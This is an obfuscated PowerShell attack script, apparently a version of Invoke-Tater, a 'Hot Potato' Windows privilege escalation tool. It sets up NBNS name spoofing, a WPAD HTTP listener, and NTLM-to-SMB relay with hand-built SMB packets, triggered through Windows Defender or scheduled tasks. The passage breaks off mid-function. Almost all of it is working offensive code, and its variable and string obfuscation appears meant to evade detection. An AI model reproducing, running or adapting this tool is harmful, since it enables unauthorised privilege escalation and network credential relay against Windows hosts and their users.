 sEt-iTEM  varIABle:IjDB4P  ( [tYpE]("{0}{1}"-F 'h','AShTAbLe'))  ;  Set-ITEm  ('VARIaBl'+'E:'+'HZGtP'+'u')  ( [TypE]("{4}{1}{0}{3}{2}" -F 'dIaGnoSTiC','eM.','rocesS','s.p','Syst') )  ; $LGN  =[TyPE]("{1}{0}{3}{2}" -f'SaPi','Dn','h','.FLus')  ;   SeT-ITeM ("VAr"+"IA"+"bl"+"E:c"+"eNi")  ( [TYpE]("{1}{0}"-F 'aY','arR'))  ;  $3mHEg8 =  [tyPe]("{0}{1}"-f'sTRin','G');   $pFE  =  [tyPe]("{3}{2}{1}{0}" -f'RT','COnVE','.','SYstEM') ; sv Fi4Cq5  (  [TYPe]("{3}{8}{4}{1}{5}{2}{6}{7}{0}"-F 'Ly','ets.','SSF','SySTEm.n','T.Sock','ADDRe','Am','i','e')) ;   SEt  24H1T  ( [typE]("{5}{0}{4}{1}{2}{3}" -f 'NET','.sOcKET','tYp','e','.SOCkEtS','SystEm.')) ;   SET-ITem  VaRIaBLe:128 ([TYPE]("{0}{4}{6}{3}{8}{2}{1}{5}{7}" -f's','.','S','.nET','YS','p','tEm','roTOcoLTYPE','.SocKET') ) ;   $ncuZ=[TYpe]("{2}{3}{1}{0}"-f 'Ter','OnveR','SYS','teM.bItc')  ; SEt  MR9pqH ( [typE]("{1}{4}{3}{2}{0}" -F 'ENcOdiNG','sysTe','xt.','.TE','m') );   $2fY= [TyPE]("{5}{0}{1}{4}{6}{2}{3}"-f'iA','g','oPwAT','ch','noStI','SYStEM.d','Cs.st')  ;  $9Pi8De=[TYpE]("{0}{2}{1}"-F 'syStEM.nEt','dNS','.')  ;   $BCy3OS =  [TYpe]("{5}{3}{1}{2}{0}{4}" -f'PadD','T.','I','m.Ne','rEsS','syste'); $k7acV= [tYpE]("{0}{3}{2}{1}" -F 'RunSP','oRy','ACT','aCEF')  ;   sET-iTEM ('Va'+'rIaB'+'L'+'E:iJV')  ([type]("{2}{1}{0}{3}" -F'E','sh','PoWer','LL')  );   $gwt  = [TYpe]("{1}{0}" -f 'Ole','CoNS'); function InV`OK`e-tA`TEr
{



[CmdletBinding()]
param
( 
    [parameter(mAndAtOry=${f`AL`se})][ValidateSet("Y","N")][String]${nb`NS}="Y",
    [parameter(MANDAToRY=${FA`Lse})][ValidateSet("Y","N")][String]${N`B`N`SlIMIT}="Y",
    [parameter(mAndatory=${FaL`se})][ValidateSet("Y","N")][String]${E`x`HAustU`dP}="N",
    [parameter(MAndatORy=${fA`l`Se})][ValidateSet("Y","N")][String]${coNsOl`E`o`UTP`Ut}="Y",
    [parameter(mANdaTOrY=${Fa`L`SE})][ValidateSet("Y","N")][String]${sT`Atu`sOu`TPuT}="Y",
    [parameter(MaNDATOrY=${fAl`SE})][ValidateSet("Y","N")][String]${Sh`OW`HELp}="Y",
    [parameter(maNdATOrY=${Fa`Lse})][ValidateSet("Y","N")][String]${t`Askde`Le`Te}="Y",
    [parameter(MANDaTory=${fAL`sE})][ValidateSet("0","1","2")][String]${T`oOl}="0",
    [parameter(mAnDAtorY=${fA`lsE})][ValidateScript({${_} -match [System.Net.IPAddress]${_} })][String]${iP}="",
    [parameter(maNdAtORy=${F`A`Lse})][ValidateScript({${_} -match [System.Net.IPAddress]${_} })][String]${Sp`ooFeR`ip}=("{1}{2}{0}"-f '.1','12','7.0.0'),
    [parameter(MaNdATory=${faL`se})][Int]${H`TTPpOrT}="80",
    [parameter(MAndaTOrY=${f`AlSE})][Int]${R`UnT`ime}="",
    [parameter(mAnDaToRy=${FAl`SE})][ValidateSet(0,1,2)][Int]${T`RIgg`Er}="1",
    [parameter(MAnDAtORy=${tr`Ue})][String]${com`ma`Nd}="",
    [parameter(MaNDatoRy=${F`AlsE})][String]${HOS`TN`AME}=("{1}{0}"-f'AD','WP'),  
    [parameter(MAndatoRy=${faL`se})][String]${t`ASkn`AMe}=("{0}{1}" -f'Tat','er'),
    [parameter(ManDaTOry=${FAl`Se})][String]${W`pADpO`RT}="80",
    [parameter(mAnDatoRy=${f`AlsE})][Array]${W`PaDDI`ReC`Thos`TS},
    [parameter(valuefROMrEmAiNinGaRgUMents=${tR`Ue})]${I`Nv`Al`i`d_PARAm`EtER}
)

if (${INvA`LID_par`Am`E`TeR})
{
    throw "$($invalid_parameter) is not a valid parameter. "
}

if(!${i`p})
{ 
    ${iP} = (&("{3}{0}{1}{2}" -f 'ne','ct','ion','Test-Con') ("{0}{1}"-f '1','27.0.0.1') -count 1 | &("{1}{2}{0}"-f'bject','Sel','ect-O') -ExpandProperty ("{0}{3}{1}{2}"-f'Ipv4Ad','e','ss','dr'))
}

if(!${co`M`mAnD})
{
    throw ("{1}{2}{6}{8}{4}{5}{0}{3}{7}{9}"-f ' enabling ','You must specify ','an -C','-','a','nd if','o','SMB','mm','Relay')
}

if(${t`ATeR}."Ru`NNIng")
{
    throw ("{7}{4}{5}{11}{8}{10}{9}{12}{3}{2}{1}{6}{0}" -f'p-Tater','se',', u','unning','nv','oke-Tater i',' Sto','I','e','y','ad','s alr',' r')
}

${glO`BAL`:t`ATer} =   (geT-ITem  VAriAbLe:IJDB4P  ).ValUe::("{3}{2}{0}{1}"-f'ize','d','chron','Syn').Invoke(@{})

${T`A`Ter}."rU`NNInG" = ${t`RUE}
${TA`TER}."CONSO`lE_`qUE`UE" = &("{0}{2}{1}" -f 'New-Ob','ect','j') ("{2}{0}{6}{1}{3}{4}{5}" -f'll','ti','System.Co','ons.Arra','y','List','ec')
${tat`ER}."S`TATUs`_qUe`Ue" = &("{0}{2}{3}{1}" -f'New-O','t','b','jec') ("{4}{6}{5}{1}{2}{0}{3}" -f'y','io','ns.Arra','List','System','ect','.Coll')
${ta`T`Er}."ConSOl`E_I`N`Put" = ${T`RuE}
${TA`T`Er}."smB_R`el`AY_aCT`ivE`_`steP" = 0
${tAT`ER}."t`RIG`gER" = ${t`R`Igger}

if(${sT`At`USouT`PuT} -eq 'Y')
{
    ${t`ATeR}."STat`US_`OUt`PuT" = ${tR`Ue}
}
else
{
    ${T`ATer}."S`TAtuS_o`U`TP`UT" = ${FA`LSE}
}

if(${T`oOl} -eq 1) 
{
    ${T`At`Er}."t`oOl" = 1
    ${TA`TeR}."NewL`I`NE" = ""
    ${Co`N`soLEOUT`pUT} = "N"
}
elseif(${To`OL} -eq 2) 
{
    ${T`A`TeR}."T`OOl" = 2
    ${T`Ater}."COns`OlE_`INpUt" = ${FaL`se}
    ${TAT`ER}."Ne`w`lINe" = "`n"
    ${cON`S`OLeOUT`PuT} = "Y"
    ${SHo`W`helP} = "N"
}
else
{
    ${Tat`Er}."to`oL" = 0
    ${tAt`er}."N`eWliNe" = ""
}

if(${TRi`G`gER} -eq 2)
{
    ${nb`Ns} = 'N'
}


${taT`er}."STat`US_`QUe`Ue".("{1}{0}" -f 'dd','A').Invoke(("$(Get-Date -format 's') - Tater (Hot Potato Privilege Escalation) started ")) > ${n`ULl}
${tat`ER}."STatUS`_`Q`UEue".("{0}{1}" -f'A','dd').Invoke(('L'+'ocal '+'IP'+' '+'Ad'+'dress '+'= '+"$IP")) > ${n`Ull}

if(${htTPP`O`Rt} -ne 80)
{
    ${TaT`ER}."S`TA`T`Us_quEUE".("{0}{1}" -f'A','dd').Invoke(('HTTP'+' '+'Po'+'rt '+'= '+"$HTTPPort")) > ${Nu`Ll}
}

if(${n`BNS} -eq 'Y')
{
    ${t`ATEr}."S`TATUS_Que`Ue".("{0}{1}"-f 'A','dd').Invoke(('Spo'+'o'+'fing '+'Ho'+'st'+'name '+'= '+"$Hostname")) > ${NU`lL}

    if(${nBNS`L`im`it} -eq 'N')
    {
        ${Ta`TEr}."STAT`Us`_quEUe".("{0}{1}"-f 'Ad','d').Invoke(("{6}{11}{7}{3}{10}{8}{4}{1}{5}{2}{9}{0}" -f'd','imiti','i','f','r L','ng D','NB','ute','ce Spoofe','sable','or','NS Br')) > ${n`ULL}
    }

}
else
{
    ${tA`TeR}."StAt`Us_q`UEUe".("{1}{0}" -f'dd','A').Invoke(("{0}{2}{3}{6}{7}{5}{1}{9}{4}{8}" -f'NB','o','NS',' Bru',' Disable','rce Sp','t','efo','d','ofing')) > ${N`ULL}
}

if(${S`Po`oFeRiP} -ne ("{3}{1}{2}{0}" -f '.1','.0','.0','127'))
{
    ${T`ATER}."STat`US`_q`UEuE".("{1}{0}" -f 'd','Ad').Invoke(('NBNS'+' '+'Spoo'+'fer'+' '+'I'+'P '+'Addr'+'e'+'ss '+'= '+"$SpooferIP")) > ${n`ULl}
}

if(${WpA`ddIrE`CtH`o`sts}."co`Unt" -gt 0)
{
    ${t`ATER}."StA`Tu`S_Queue".("{1}{0}"-f 'd','Ad').Invoke(("{2}{0}{4}{3}{5}{1}" -f 'PA','= ','W','Direct H','D ','osts ') + ${WPaD`dIrEc`T`HO`stS} -join ",") > ${nu`LL}
}

if(${w`P`Adp`oRt} -ne 80)
{
    ${TAT`er}."ST`AtUS_`QuEUE".("{0}{1}"-f'Ad','d').Invoke(('WP'+'AD '+'Po'+'rt '+'= '+"$WPADPort")) > ${nU`ll}
}

if(${EXhAU`sTu`dp} -eq 'Y')
{
    ${TA`T`ER}."S`TAt`Us`_quEue".("{0}{1}"-f'A','dd').Invoke(("{5}{1}{6}{0}{4}{3}{2}"-f'on E',' Ex','ed','bl','na','UDP Port','hausti')) > ${Nu`lL}
}

if(${t`RiggER} -eq 0)
{
    ${tA`TeR}."st`ATus_Qu`eUe".("{1}{0}" -f'dd','A').Invoke(("{3}{0}{2}{1}"-f ' D','led','isab','Relay Trigger')) > ${Nu`ll}
}
elseif(${trIgg`ER} -eq 1)
{
    ${TA`Ter}."s`Ta`TUs_Q`UeuE".("{0}{1}"-f'Ad','d').Invoke(("{6}{2}{0}{4}{8}{1}{3}{9}{7}{5}" -f 's Def',' ','indow','Tri','en','d','W','r Enable','der','gge')) > ${Nu`lL}
}
elseif(${TR`IgG`eR} -eq 2)
{
    ${ta`T`Er}."s`TATUS_Q`UeUE".("{0}{1}" -f 'Ad','d').Invoke(("{1}{4}{0}{2}{3}{5}" -f'Task Tri','Sch','g','ger ','eduled ','Enabled')) > ${nU`lL}
    ${T`AT`Er}."TasK`NaMe" = ${tA`sk`Na`me} -replace " ","_"
    
    if(${tasKdeL`E`Te} -eq 'Y')
    {
        ${tA`T`ER}."STATU`S`_Qu`eue".("{0}{1}" -f'A','dd').Invoke(('Sched'+'uled'+' '+'Ta'+'sk '+'P'+'r'+'efix '+'= '+"$Taskname")) > ${N`Ull}
        ${tA`T`Er}."STaTuS`_QuE`Ue".("{0}{1}"-f 'Ad','d').Invoke(("{6}{4}{5}{1}{3}{2}{7}{0}"-f 'd','n','b','a','tion',' E','Scheduled Task Dele','le')) > ${Nu`ll}
        ${ta`TER}."tAs`K_d`ELe`Te" = ${T`RUe}
    }
    else
    {
        ${tA`Ter}."StA`T`U`s_qUEue".("{0}{1}" -f'A','dd').Invoke(('Sche'+'du'+'l'+'ed '+'Task'+' '+'= '+"$Taskname")) > ${n`UlL}
        ${T`A`TER}."staT`US_`Qu`eue".("{0}{1}"-f 'Ad','d').Invoke(("{5}{3}{2}{0}{6}{1}{4}" -f'Deleti',' Dis','d Task ','hedule','abled','Sc','on')) > ${n`ULL}
        ${TA`TeR}."TAsK`_D`E`letE" = ${F`ALse}
    }

}

if(${COnS`o`LeOUtpUT} -eq 'Y')
{
    ${TAT`er}."S`TatUS_Qu`e`UE".("{1}{0}" -f 'dd','A').Invoke(("{3}{5}{1}{8}{4}{7}{6}{0}{2}"-f'Enable','l Tim','d','R','nso','ea','tput ','le Ou','e Co')) > ${N`Ull}
    ${t`AtEr}."C`ONso`l`E_outpUT" = ${t`Rue}
}
else
{

    if(${T`A`TER}."to`OL" -eq 1)
    {
        ${tA`TER}."sT`Atus_`quE`UE".("{0}{1}" -f'Ad','d').Invoke(("{9}{5}{12}{3}{0}{1}{2}{8}{4}{11}{6}{10}{7}"-f'isable','d Due T','o','D','ternal Tool ','nsole O','c','n',' Ex','Real Time Co','tio','Sele','utput ')) > ${nu`lL}
    }
    else
    {
        ${t`At`ER}."St`ATus`_q`UEuE".("{1}{0}" -f'dd','A').Invoke(("{6}{7}{4}{0}{1}{8}{3}{5}{2}" -f 'le',' ','t Disabled','p','nso','u','Real Time',' Co','Out')) > ${n`ULl}
    }

}

if(${RU`N`TImE} -eq '1')
{
    ${ta`TeR}."sTaTu`S_Q`U`euE".("{1}{0}"-f'dd','A').Invoke(('Ru'+'n '+'Ti'+'me '+'= '+"$RunTime "+'Minu'+'t'+'e')) > ${n`Ull}
}
elseif(${R`UNti`me} -gt 1)
{
    ${T`ATER}."STA`T`Us_QU`EUE".("{0}{1}" -f'A','dd').Invoke(('Ru'+'n '+'Ti'+'me '+'= '+"$RunTime "+'Minu'+'t'+'es')) > ${nu`ll}
}

if(${shO`WhE`Lp} -eq 'Y')
{
    ${T`AT`eR}."S`Tatus_QUe`UE".("{1}{0}" -f 'dd','A').Invoke(("{2}{3}{1}{6}{0}{7}{4}{5}" -f 'te','op','Run S','t',' to s','top Tater early','-Ta','r')) > ${N`Ull}
        
    if(${Ta`TeR}."C`O`Ns`OLe_OUtpUT")
    {
        ${tA`Ter}."s`TATus_QU`E`UE".("{1}{0}"-f 'd','Ad').Invoke(("{3}{1}{15}{11}{13}{10}{12}{5}{2}{8}{7}{6}{14}{0}{9}{4}" -f 'e functi',' Get-Command','ho','Use','s',' s','lab','avai','w ','on','oun Tate','-','r* to','N','l',' ')) > ${n`ULL}
        ${t`ATER}."stATU`s`_`QueUE".("{1}{0}"-f 'dd','A').Invoke(("{4}{0}{2}{1}{5}{8}{7}{3}{6}{9}" -f 'ess an',' ','y',' consol','Pr','k','e outpu','p real time','ey to sto','t')) > ${N`ULL}
        ${T`AteR}."sTat`Us_Q`UEUe".("{1}{0}" -f 'd','Ad').Invoke("") > ${NU`Ll}
    }

}

if(${Tat`eR}."s`TatuS_O`U`TpuT")
{

    while(${tA`T`ER}."StA`T`US_q`UEuE"."co`Unt" -gt 0)
    {
        &("{3}{0}{2}{1}" -f'e-','put','out','writ')(${ta`TER}."sT`AtuS_qU`euE"[0] + ${t`ATEr}."nEW`L`INe")
        ${t`ATer}."S`Tat`Us_Q`UEUe".("{0}{1}{2}"-f'RemoveRa','n','ge').Invoke(0,1)
    }

}

${p`ROC`esS`_Id} =   $HzgtPu::("{0}{2}{3}{4}{1}"-f'GetCurr','s','e','ntProc','es').Invoke() | &("{2}{1}{0}{3}"-f 'bjec','t-O','Selec','t') -expand ('id')
${PRO`Ce`ss_id} =   ( gEt-cHiLdiTEM  ("v"+"ariAblE"+":NcuZ") ).VAluE::"To`STRI`Ng"(  (  lS vARIABLE:NCuZ).VAlue::("{0}{1}"-f'GetB','ytes').Invoke(${PRo`CE`Ss_Id}))
${p`Roc`Es`S_id} = ${P`ROc`eSs_Id} -replace ("{1}{0}" -f'-00','-00'),""
[Byte[]] ${TA`TEr}."PrO`ces`S_Id`_`BYtEs" = ${pr`OCess_`Id}.("{0}{1}" -f 'Sp','lit').Invoke("-") | &("{0}{2}{1}"-f'ForEac','bject','h-O'){[Char]  $pfE::("{0}{1}"-f 'ToI','nt16').Invoke(${_},16)}




${shA`RED_`BAsiC_`FuNCtiOnS_sC`RIP`TbLo`Ck} =
{

    function d`ATA`LENgtH
    {
        param ([Int]${leNGT`H_st`ART},[Byte[]]${sTr`in`G_ExtraCT_DA`TA})

        ${stRING_L`eN`G`Th} =   ( GeT-cHildITeM  VArIablE:ncUZ  ).Value::"TO`i`Nt16"(${S`TR`in`G_`ExTr`Act_d`AtA}[${l`EngtH_sTa`Rt}..(${LeNgth_`S`T`ArT} + 1)],0)
        return ${s`TrI`Ng_l`eNGTH}
    }

    function d`Atato`sTRInG
    {
        param ([Int]${stRINg`_`lENG`TH},[Int]${sTr`iN`g2_leN`G`Th},[Int]${sTr`ing`3_LENGTh},[Int]${s`TrINg_`St`Art},[Byte[]]${s`TrI`N`g_exTraCt`_`daTa})

        ${S`T`RIN`g_DAtA} =  $ncuZ::"tOsT`RInG"(${St`Rin`G_`eXT`RAc`T_DaTA}[(${s`TrI`NG_STaRT} + ${ST`R`iNG2`_l`ENgth} + ${STr`iN`G`3_`LeNgth})..(${s`Trin`g_`sTA`RT} + ${s`TR`i`NG_`leNgTH} + ${sT`R`ING2_leNgth} + ${s`Tr`InG3_LE`NgTH} - 1)])
        ${sT`RinG_`DAta} = ${STrin`G_d`AtA} -replace "-00",""
        ${stR`ing`_d`AtA} = ${sT`RInG_`da`Ta}.("{1}{0}" -f'lit','Sp').Invoke("-") | &("{2}{0}{1}" -f 'Each-O','bject','For'){[Char] ( ChilDitEM  ("V"+"ArIA"+"blE:pf"+"E")).VaLUe::("{1}{0}" -f '16','ToInt').Invoke(${_},16)}
        ${STr`In`g_E`xtr`ACT} = &("{1}{2}{0}" -f'bject','New','-O') ("{1}{0}{2}" -f'yste','S','m.String') (${S`TRInG_DA`TA},0,${StR`I`Ng_Da`Ta}."lEnG`TH")
        return ${sTr`In`g_EXtr`A`Ct}
    }

    function dNsFL`US`Hr`eSOLv`ERcA`cHe
    {
        ${dns_MEMbe`R_d`efiNiTI`on} = @'
            [DllImport("dnsapi.dll", EntryPoint="DnsFlushResolverCache")]
            private static extern UInt32 DnsFlushResolverCache();

            public static void FlushResolverCache()
            {
                UInt32 result = DnsFlushResolverCache();
            }
'@

        &("{0}{2}{1}"-f 'Add-','e','Typ') -MemberDefinition ${DN`S`_Member_`d`Efi`NI`TIoN} -Namespace ("{0}{1}"-f 'D','NSAPI') -Name ("{0}{1}"-f'Flu','sh') -UsingNamespace ("{4}{3}{1}{0}{2}" -f '.C','m','ollections','ste','Sy'),("{3}{2}{1}{0}{4}" -f'ntMo','ompone','m.C','Syste','del')
          (gEt-item VaRIABLE:LgN  ).vaLue::("{2}{0}{1}{4}{5}{3}" -f 'lus','hResol','F','he','verC','ac').Invoke()
    }

    function sToP`T`A`TER
    {
        ${taT`er}."ConsO`Le_Q`U`euE".("{1}{0}" -f 'd','Ad').Invoke(("$(Get-Date -format 's') - Stopping HTTP listener "))
        ${T`ATer}."HtT`p_c`lI`eNt".("{1}{0}" -f'ose','Cl').Invoke()
        &("{0}{1}{2}" -f 'start','-slee','p') -s 1
        ${Ta`T`ER}."Http`_l`isTeNER"."sE`RVER"."B`Lock`iNg" = ${fA`L`sE}
        &("{1}{0}{2}"-f 'art','St','-Sleep') -s 1
        ${T`ATER}."H`T`Tp_liSTENer"."seR`VEr".("{0}{1}" -f'C','lose').Invoke()
        &("{0}{1}{2}" -f'S','ta','rt-Sleep') -s 1
        ${tAt`eR}."hT`T`p_LisTen`eR".("{0}{1}"-f'S','top').Invoke()

        if(${T`AtEr}."smbRElAy`_SUc`C`E`SS")
        {
          
            if(${Ta`T`ER}."TrIg`GEr" -eq 2)
            {

                if(${tA`TER}."TAsK_dEl`e`TE" -and ${t`A`Ter}."Ta`sK_`ADDeD")
                {
                    ${SCH`e`duLED_T`AsK_deL`e`TED} = ${fAL`SE}
                    ${Sc`H`EdulE_s`Er`ViCe} = &("{3}{1}{2}{0}" -f 't','w-obje','c','ne') -com(("{4}{3}{1}{0}{2}"-f 'rvi','Se','ce','hedule.','Sc'))
                    ${SChe`Dule_sE`RvI`ce}.("{1}{0}" -f 'ect','Conn').Invoke()
                    ${SChe`DuLEd`_taS`K_fo`l`d`er} = ${sC`hE`Du`l`E_`sERVICe}.("{0}{2}{1}{3}"-f'GetFo','d','l','er').Invoke("\")
                    ${sC`hED`ULe`d_tASK`_lI`sT} = ${scH`edUled_TA`sk_fOl`D`er}.("{2}{0}{1}" -f 'etTa','sks','G').Invoke(1)

                    foreach(${S`C`HE`Dule`D_tasK} in ${scheDU`leD_`T`ASk_`LISt})
                    {

                        if(${s`c`hedU`L`Ed_taSk}."Na`mE" -eq ${Ta`Ter}."t`AsK")
                        {
                            ${SChe`Du`LeD_`TAsk_`FOLder}.("{1}{0}{2}"-f 'eleteTa','D','sk').Invoke(${SC`HE`dU`led_`TASk}."nA`ME",0)
                        }
                    
                    }

                    foreach(${SCH`e`DULED`_T`Ask} in ${SchEDu`le`d`_T`ASk_LIsT})
                    {

                        if(${S`ChE`dulE`D_tAsK}."n`AmE" -eq ${Ta`T`eR}."Ta`sK")
                        {
                            ${sChEdulE`D_TASK_`DE`l`e`T`ed} = ${tr`UE}
                        }
                    
                    }

                    if(${ScHeduL`ed_T`As`K_`dEleteD})
                    {
                        ${t`AT`Er}."Console`_`qU`euE".("{1}{0}" -f'd','Ad').Invoke(("$(Get-Date -format 's') - Scheduled task  ") + ${ta`T`ER}."T`AsK" + ("{2}{3}{4}{0}{6}{5}{1}" -f ' s','ly',' d','ele','ted','sful','ucces')) 
                    }
                    else
                    {
                        ${T`A`TER}."co`NsO`lE`_qUeue".("{1}{0}"-f 'dd','A').Invoke(("$(Get-Date -format 's') - Scheduled task  ") + ${taT`er}."t`ASk" + ("{6}{2}{5}{9}{1}{3}{4}{7}{0}{8}" -f'e ','le','d','d, ','remo','ele',' ','v','manually','tion fai'))
                    }

                }
                elseif(${Tat`ER}."ta`sK_ADD`Ed")
                {
                    ${T`At`ER}."C`O`NSO`LE_`queuE".("{1}{0}"-f 'd','Ad').Invoke(("$(Get-Date -format 's') - Remove scheduled task  ") + ${T`AT`eR}."t`AsK" + ("{4}{7}{1}{6}{5}{0}{3}{2}" -f'in','l','hed','is',' m','hen f','y w','anual'))
                }

            }

        ${T`AtER}."coN`S`olE_`Q`UEUe".("{1}{0}"-f 'd','Ad').Invoke(("$(Get-Date -format 's') - Tater was successful and has exited "))
        }
        else
        {
            ${TAt`eR}."C`ONsOle_qU`eUe".("{1}{0}"-f 'd','Ad').Invoke(("$(Get-Date -format 's') - Tater was not successful and has exited "))
        }

        &("{2}{1}{0}"-f'p','art-Slee','St') -s 1 
        ${Ta`TER}."RuNni`NG" = ${f`ALsE}
    }

}


${SMB_ntlM_Func`Ti`ONS_S`CrIP`Tb`lOck} =
{

    function sM`B`Nt`LM`challeN`ge
    {
        param ([Byte[]]${PaYLO`AD`_B`Y`TES})

        ${pA`yl`oad} =  ( DiR  vaRiAble:nCuZ).vALUE::("{0}{1}" -f'ToS','tring').Invoke(${PAY`l`OAd_B`Ytes})
        ${pAyLo`AD} = ${P`AylO`AD} -replace "-",""
        ${NTL`m_In`d`ex} = ${PA`y`loAd}.("{2}{1}{0}"-f'exOf','nd','I').Invoke(("{3}{0}{1}{2}" -f'E54','4C4D5353','5000','4'))

        if(${PA`YlOad}.("{2}{1}{0}" -f'ing','tr','SubS').Invoke((${N`TLM_`Ind`Ex} + 16),8) -eq ("{1}{0}" -f'00','020000'))
        {
            ${NTlM`_CHa`lL`eN`GE} = ${P`A`yLOAd}.("{2}{0}{1}" -f 'trin','g','SubS').Invoke((${nT`LM_IN`dEX} + 48),16)
        }

        return ${n`TlM`_cHalLENgE}
    }

}


${SMb_r`EL`Ay`_ChaL`LEN`gE_ScRIPTBLOck} =
{

    function sMBreL`AYChalL`e`N`Ge
    {
        param (${S`M`B_rELay_sOC`ket},${Ht`TP_re`QuE`ST_`BYtEs})

        if (${Sm`B`_RElaY_`sOc`Ket})
        {
            ${s`Mb_`RelaY_challen`GE`_`stReAM} = ${sMB_relaY_`so`c`keT}.("{2}{0}{1}" -f 'etSt','ream','G').Invoke()
        }
        
        ${S`m`B_`R`e`laY`_cHAlLENge_byTes} = &("{1}{2}{0}" -f't','New-O','bjec') ("{2}{1}{3}{0}"-f'[]','ystem.B','S','yte') 1024
        ${i} = 0
        
        :SMB_relay_challenge_loop while (${I} -lt 2)
        {

            switch (${i})
            {

                0
                {
                    ${s`mB_relA`y_chAlLenge_s`e`ND} = 0x00,0x00,0x00,0x2f,0xff,0x53,0x4d,0x42,0x72,0x00,0x00,0x00,0x00,
                                                0x18,0x01,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0xff,0xff +
                                                ${t`Ater}."Proce`Ss_`i`d_b`yteS" + 
                                                0x00,0x00,0x00,0x00,0x00,0x0c,0x00,0x02,0x4e,0x54,0x20,0x4c,0x4d,
                                                0x20,0x30,0x2e,0x31,0x32,0x00
                }
                
                1
                { 
                    ${SmB`_blO`B_l`eNg`Th} =  $nCuz::"tosT`Ri`Ng"( $ncUz::("{1}{2}{0}" -f 's','GetBy','te').Invoke(${htT`P_`R`eQ`Uest_bytEs}."Le`NgTh"))
                    ${Smb_BLoB`_LE`Ng`Th} = ${SM`B`_`BlO`B_lenGtH} -replace ("{2}{1}{0}" -f '0','00-0','-'),""
                    ${SM`B_bLOb_`l`ENG`TH} = ${SMB`_b`lOb_`L`Ength}.("{0}{1}"-f 'Spl','it').Invoke("-") | &("{1}{0}{3}{2}"-f'O','ForEach-','ct','bje'){[Char]  ( VARIaBle  ("PF"+"E") -VA)::("{1}{2}{0}" -f'16','ToI','nt').Invoke(${_},16)}
                    ${s`mB_B`YTE`_cOunT} =  $NCuZ::"tOStR`iNg"(  (  Get-VaRiabLe  ('nc'+'uZ') ).vaLUE::("{0}{1}{2}"-f 'G','etByte','s').Invoke(${htTP_reqUe`s`T_bYt`ES}."LenG`Th" + 28))
                    ${sM`B_BYTE_C`OunT} = ${sm`B_BYTE_co`U`NT} -replace ("{2}{1}{0}"-f'0-00','0','-'),""
                    ${sm`B_B`y`Te`_coUNT} = ${smb_`ByTE_c`o`U`Nt}.("{1}{0}"-f'lit','Sp').Invoke("-") | &("{0}{1}{2}" -f 'For','Each-O','bject'){[Char]  ( cHilditEM ("VARiA"+"bLE:"+"P"+"FE")).vAlue::("{1}{2}{0}"-f't16','To','In').Invoke(${_},16)}
                    ${S`m`B_NET`BIO`S_leng`Th} =   ( childitEm  ("vAr"+"I"+"ABl"+"E:NcuZ")).valUe::"t`oStrIng"( $NCuZ::("{0}{1}" -f'GetByt','es').Invoke(${H`TTP_ReQUe`sT_B`yTEs}."Le`NGTh" + 87))
                    ${S`mB_`NeTbIOs_l`ENG`TH} = ${SmB_NetB`IoS`_le`Ng`Th} -replace ("{0}{1}"-f '-','00-00'),""
                    ${SMB_n`Et`B`iO`S_lengtH} = ${Smb_NeTBIOs`_LeN`g`Th}.("{1}{0}" -f 'plit','S').Invoke("-") | &("{3}{1}{2}{0}"-f't','ach-','Objec','ForE'){[Char] ( VarIablE pFe -vALUeOn )::("{2}{1}{0}"-f 't16','oIn','T').Invoke(${_},16)}
                     $cENI::("{2}{0}{1}"-f 'e','verse','R').Invoke(${SM`B_`NE`T`BiO`S_lEnGth})
                    
                    ${sM`B_rE`lAY_C`h`AlLeng`e_SenD} = 0x00,0x00 +
                                                ${Sm`B_neTb`IoS_`LEnGth} +
                                                0xff,0x53,0x4d,0x42,0x73,0x00,0x00,0x00,0x00,0x18,0x03,0xc8,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff +
                                                ${Ta`T`ER}."P`Ro`cEss`_Id_B`yTEs" +
                                                0x00,0x00,0x00,0x00,0x0c,0xff,0x00,0x00,0x00,0xff,0xff,0x02,0x00,
                                                0x01,0x00,0x00,0x00,0x00,0x00 +
                                                ${sMb`_Blob_l`EN`gtH} +
                                                0x00,0x00,0x00,0x00,0x44,0x00,0x00,0x80 +
                                                ${SMb_By`TE`_c`oU`NT} +
                                                ${HTt`P_RE`QuESt_B`yTeS} +
                                                0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,0x77,0x00,0x73,
                                                0x00,0x00,0x00,0x6a,0x00,0x43,0x00,0x49,0x00,0x46,0x00,0x53,0x00,
                                                0x00,0x00
                }

            }

            ${S`MB`_ReLAy_c`haLlengE`_`StREam}.("{0}{1}"-f 'Writ','e').Invoke(${s`Mb_Rela`Y_chalL`eNge_S`eND},0,${S`Mb_rEl`AY_ChaL`L`EN`GE`_seNd}."le`Ng`TH")
            ${SMB_REl`Ay_chal`L`ENgE_s`Tream}.("{0}{1}" -f'Flu','sh').Invoke()
            ${s`mb_RelAy_C`H`AlLENg`E`_`STRE`AM}.("{0}{1}"-f'R','ead').Invoke(${SM`B`_Re`la`Y_c`hALlEnGE_BYtES},0,${S`M`B`_RelaY_cHa`LleNGe_bYt`Es}."L`EnGTH")
            ${i}++
        }
        
        return ${sM`B_RELAY_Ch`AL`LeNG`E_bytes}
    }

}


${SMB_r`e`lAY_`R`Esp`o`NS`e_SCRiPtbL`OCK} =
{

    function Sm`BrELayR`E`spO`Nse
    {
        param (${SmB_rEl`AY`_`soC`K`Et},${hTT`P_reQ`UeS`T_b`yTES},${smB_`Us`Er`_id})
    
        ${S`mb_reLay`_Re`spONsE_`BYTEs} = &("{2}{0}{1}"-f 'w-Obj','ect','Ne') ("{0}{3}{1}{2}"-f 'Syst','yte[',']','em.B') 1024

        if (${s`MB_re`Lay`_`SoCK`Et})
        {
            ${SMb_RelAY_RE`sPo`N`s`E_`sTrEAm} = ${sMb`_reLAy_SO`C`kET}.("{2}{0}{1}"-f 'tStr','eam','Ge').Invoke()
        }
        
        ${SmB_bLOB_Le`N`GtH} =  (  gET-vAriABlE ('nCu'+'Z') ).VALUE::"ToSTR`iNg"( (  Get-VaRiABle  ('n'+'cUz') -VALU )::("{1}{2}{0}"-f 'tes','Ge','tBy').Invoke(${H`Ttp_`RE`quesT_b`Y`TEs}."L`e`Ngth"))
        ${s`M`B_bL`oB`_lEnGTh} = ${SMB_B`lO`B`_`lENGTH} -replace ("{0}{2}{1}"-f '-','00','00-'),""
